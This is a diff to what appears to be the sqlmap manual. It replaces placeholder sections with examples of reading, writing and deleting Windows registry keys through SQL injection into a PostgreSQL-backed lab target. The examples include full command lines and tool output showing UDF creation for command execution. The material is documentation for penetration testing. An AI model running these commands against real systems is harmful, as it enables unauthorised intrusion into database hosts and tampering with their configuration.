@@ -5254,68 +5254,164 @@ meterpreter > exit
 
 <sect1>Windows registry access
 
+<p>
+It is possible to access Windows registry when the back-end 
+database management system is either MySQL, PostgreSQL or 
+Microsoft SQL Server, and when the underlying database layer 
+supports stacked SQL queries. Also, session user has to have
+the needed privileges to access it.
+
 <sect2>Read a Windows registry key value
 
 <p>
 Option: <tt>-</tt><tt>-reg-read</tt>
 
 <p>
-TODO
+Using this option you can read registry key values.
 
+<p>
+Example on a <bf>PostgreSQL 8.4</bf> target:
 
-<sect2>Write a Windows registry key value data
+<tscreen><verb>
+$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-read
+
+[...]
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS: PostgreSQL
+
+[hh:mm:15] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:15] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:15] [INFO] retrieved: 8.4.2,
+[hh:mm:23] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:23] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:23] [INFO] retrieved: 1
+[hh:mm:23] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:23] [INFO] testing if current user is DBA
+[hh:mm:23] [INFO] retrieved: 1
+[hh:mm:23] [INFO] checking if UDF 'sys_eval' already exist
+[hh:mm:23] [INFO] retrieved: 0
+[hh:mm:24] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:24] [INFO] retrieved: 0
+[hh:mm:25] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[hh:mm:25] [INFO] creating UDF 'sys_exec' from the binary UDF file
+which registry key do you want to read? [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion]
+which registry key value do you want to read? [ProductName]
+[hh:mm:34] [INFO] reading Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName'
+[hh:mm:35] [INFO] retrieved: ProductName        REG_SZ  Microsoft Windows XP
+Registry key value data:    'ProductName        REG_SZ  Microsoft Windows XP'
+[...]
+</verb></tscreen>
+
+<sect2>Write a Windows registry key value
 
 <p>
 Option: <tt>-</tt><tt>-reg-add</tt>
 
 <p>
-TODO
+Using this option you can write registry key values.
 
+<p>
+Example on a <bf>PostgreSQL 8.4</bf> target:
 
-<sect2>Delete a Windows registry key value
+<tscreen><verb>
+$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-add
+
+[...]
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS: PostgreSQL
+
+[hh:mm:20] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:20] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:20] [INFO] retrieved: 8.4.2,
+[hh:mm:29] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:29] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:29] [INFO] retrieved: 1
+[hh:mm:30] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:30] [INFO] testing if current user is DBA
+[hh:mm:30] [INFO] retrieved: 1
+[hh:mm:30] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:30] [INFO] retrieved: 0
+[hh:mm:06] [INFO] creating UDF 'sys_exec' from the binary UDF file
+which registry key do you want to write? HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap
+which registry key value do you want to write? Test
+which registry key value data do you want to write? 1
+which registry key value data-type is it? [REG_SZ] REG_DWORD
+[hh:mm:41] [INFO] adding Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test' with data '1'. This will 
+work only if the user running the database process has privileges to modify the Windows registry.
+
+[*] shutting down at: hh:mm:42
+</verb></tscreen>
+
+<sect2>Delete a Windows registry key
 
 <p>
 Option: <tt>-</tt><tt>-reg-del</tt>
 
 <p>
-TODO
-
-
-<sect2>Windows registry key
+Using this option you can delete registry keys.
 
 <p>
-Option: <tt>-</tt><tt>-reg-key</tt>
+Example on a <bf>PostgreSQL 8.4</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-del
+
+[...]
+web server operating system: Windows
+web application technology: PHP 5.3.1, Apache 2.2.14
+back-end DBMS: PostgreSQL
+
+[hh:mm:20] [INFO] testing stacked queries support on parameter 'id'
+[hh:mm:20] [INFO] detecting back-end DBMS version from its banner
+[hh:mm:20] [INFO] retrieved: 8.4.2,
+[hh:mm:29] [INFO] the web application supports stacked queries on parameter 'id'
+[hh:mm:29] [INFO] fingerprinting the back-end DBMS operating system
+[hh:mm:29] [INFO] retrieved: 1
+[hh:mm:30] [INFO] the back-end DBMS operating system is Windows
+[hh:mm:30] [INFO] testing if current user is DBA
+[hh:mm:30] [INFO] retrieved: 1
+[hh:mm:30] [INFO] checking if UDF 'sys_exec' already exist
+[hh:mm:30] [INFO] retrieved: 0
+[hh:mm:06] [INFO] creating UDF 'sys_exec' from the binary UDF file
+which registry key do you want to delete? HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap
+which registry key value do you want to delete? Test
+are you sure that you want to delete the Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test? [y/N] y
+[hh:mm:26] [INFO] deleting Windows registry path 'HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap\Test'. This will work only 
+if the user running the database process has privileges to modify the Windows registry.
+
+[*] shutting down at: hh:mm:27
+</verb></tscreen>
+
+<sect2>Auxiliary registry switches
 
 <p>
-TODO
-
-
-<sect2>Windows registry key value
+Option: <tt>-</tt><tt>-reg-key</tt>, <tt>-</tt><tt>-reg-value</tt>, 
+<tt>-</tt><tt>-reg-data</tt> and <tt>-</tt><tt>-reg-type</tt>
 
 <p>
-Option: <tt>-</tt><tt>-reg-value</tt>
+These switches can be used to provide data needed for proper running of
+options <tt>-</tt><tt>-reg-read</tt>, <tt>-</tt><tt>-reg-add</tt> and 
+<tt>-</tt><tt>-reg-del</tt>. So, instead of providing registry key
+information when asked, you can use them at command prompt as program
+arguments.
 
 <p>
-TODO
-
-
-<sect2>Windows registry key value data
-
-<p>
-Option: <tt>-</tt><tt>-reg-data</tt>
+With <tt>-</tt><tt>-reg-key</tt> option you specify used windows 
+registry key path, with <tt>-</tt><tt>-reg-value</tt> value item
+name inside provided key, with <tt>-</tt><tt>-reg-data</tt> value 
+data, while with <tt>-</tt><tt>-reg-type</tt> option you specify
+type of the value item.
 
 <p>
-TODO
+So, another way of running example from option 
+<tt>-</tt><tt>-reg-add</tt> could be:
 
-
-<sect2>Windows registry key value type
-
-<p>
-Option: <tt>-</tt><tt>-reg-type</tt>
-
-<p>
-TODO
-
+<tscreen><verb>
+$ python sqlmap.py -u http://172.16.213.128/sqlmap/pgsql/get_int.php?id=1 --reg-add\ 
+  --reg-key=HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap --reg-value=Test --reg-type=REG_SZ --reg-data=1
+</verb></tscreen>
 
 <sect1>Miscellaneous
 
